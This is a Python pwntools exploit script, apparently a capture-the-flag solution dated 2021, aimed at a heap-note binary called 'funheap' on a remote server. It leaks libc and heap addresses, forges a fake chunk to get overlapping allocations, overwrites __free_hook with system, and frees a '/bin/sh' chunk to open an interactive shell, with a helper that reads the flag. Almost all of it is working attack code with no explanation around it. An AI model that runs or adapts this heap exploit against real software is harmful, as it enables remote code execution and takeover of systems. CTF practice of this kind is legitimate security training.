# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './funheap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '1.116.140.142'
    port = '10001'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size):
    cmd(1)
    sla('Size:' , size)

def edit(idx,content):
    cmd(4)
    sla('Index:' , idx)
    sa('Note:' , content) 

def show(idx):
    cmd(3)
    sla('Index:' , idx)

def delete(idx):
    cmd(2)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x500) #0
    add(0x18) #1
    delete(0)
    add(0x500) #0
    show(0)
    
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    add(0x510) #2
    add(0x18) #3
    delete(0)
    delete(2)

    add(0x608) #0
    add(0x510) #2

    show(2)

    ru('Note:')
    heap_addr= u64(p.recv(6).ljust(8,'\x00')) 
    lg('heap_addr',heap_addr)

    heap_base = heap_addr&0xfffffffff000
    lg('heap_base',heap_base)
    add(0x508) #4
    add(0x18) #5

    offset = heap_addr - heap_base

    add(0x4f0) #6
    add(0x18) #7

    fake_chunk_addr = heap_base + offset + 0xa70 + 0x10
    fake_chunk = flat(
        0,0x621,
        fake_chunk_addr + 0x18, fake_chunk_addr + 0x20,
        0 , 0,
        fake_chunk_addr
    )

    lg('fake_chunk_addr',fake_chunk_addr)

    edit(0 , fake_chunk + '\n')
    edit(5 , flat(0,0,0x620))
    delete(6)

    delete(7)
    delete(5)

    add(0x630) #5
    edit(5 , '\x00'*0x5f8 + flat(0x20 , __free_hook - 0x8) + '\n')
    add(0x18) #6
    add(0x18) #7
    edit(7 , flat('/bin/sh\x00' , system_addr) + '\n')

    delete(7)
    # dbg()



    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   funheap.py
@Time    :   2021/11/18 19:02:23
@Author  :   Niyah 
'''